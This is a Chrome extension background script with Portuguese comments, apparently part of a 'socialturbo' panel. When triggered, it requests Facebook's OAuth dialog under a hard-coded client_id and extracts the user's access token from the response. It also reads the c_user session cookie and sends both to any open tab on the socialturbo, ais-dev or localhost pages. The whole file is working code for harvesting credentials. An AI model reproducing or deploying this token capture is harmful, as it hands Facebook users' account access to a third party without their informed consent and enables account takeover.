let capturedData = null;

// Função para buscar o Token EAAA direto da API do Facebook (Metodo Profissional)
async function fetchFacebookToken() {
  try {
    const response = await fetch("https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.facebook.com/connect/login_success.html&response_type=token&scope=email", {
      method: 'GET'
    });
    const text = await response.text();
    const tokenMatch = text.match(/access_token=([^&]+)/);
    
    if (tokenMatch && tokenMatch[1]) {
      return tokenMatch[1];
    }
  } catch (e) {
    console.error("Erro ao buscar token:", e);
  }
  return null;
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'start_capture') {
    fetchFacebookToken().then(token => {
      if (token) {
        // Pega os dados básicos do cookie
        chrome.cookies.get({ url: 'https://www.facebook.com', name: 'c_user' }, (cookie) => {
          capturedData = {
            source: 'socialturbo_extension',
            token: token,
            uid: cookie ? cookie.value : '1000',
            name: "Perfil Conectado"
          };
          
          // Notifica todas as abas do painel
          chrome.tabs.query({}, (tabs) => {
            tabs.forEach(tab => {
              if (tab.url && (tab.url.includes('socialturbo') || tab.url.includes('ais-dev') || tab.url.includes('localhost'))) {
                chrome.tabs.sendMessage(tab.id, capturedData);
              }
            });
          });
          
          sendResponse({ success: true, name: capturedData.name });
        });
      } else {
        sendResponse({ success: false, error: "Token não encontrado. Verifique se está logado no Facebook." });
      }
    });
    return true; // async
  }
  
  if (request.action === 'get_captured_data') {
    sendResponse(capturedData);
  }
});
